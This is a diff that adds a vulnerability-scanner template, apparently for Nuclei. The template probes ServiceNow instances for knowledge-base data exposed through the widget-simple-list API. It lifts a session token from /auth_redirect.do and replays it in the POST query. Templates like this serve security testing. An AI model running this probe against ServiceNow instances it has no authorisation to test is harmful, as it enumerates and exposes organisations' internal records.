@@ -1,0 +1,59 @@
+id: servicenow-widgets-enumeration-short
+
+info:
+  name: ServiceNow Widgets Enumeration - Short
+  author: notnotnotveg
+  severity: high
+  reference:
+    - https://github.com/aaron-costello/ServiceNow-Schema/blob/main/Filtered_Common_Tables.txt
+    - https://github.com/bsysop/servicenow
+  description: ServiceNow Widgets Enumeration - Short
+  metadata:
+    shodan-query: NA
+  tags: ServiceNow
+
+http:
+  - payloads:
+      servicenow-uris:
+        - "t=kb_knowledge&f=text"
+
+    attack: pitchfork
+
+    raw:
+      - |
+        GET /auth_redirect.do HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+
+      - |
+        POST /api/now/sp/widget/widget-simple-list?{{servicenow-uris}} HTTP/1.1
+        Host: {{Hostname}}
+        X-UserToken: {{USERTOKEN}}
+        Content-Type: application/json
+        Accept: application/json
+        Connection: close
+
+
+
+    cookie-reuse: true
+    extractors:
+      - type: regex
+        name: USERTOKEN
+        group: 1
+        part: body
+        internal: true
+        regex:
+          - "var g_ck = '([0-9a-zA-Z.]+)';"
+
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        part: body_2
+        status:
+          - 201
+      - type: word
+        words:
+          - "\"count\":"
+        part: body_2
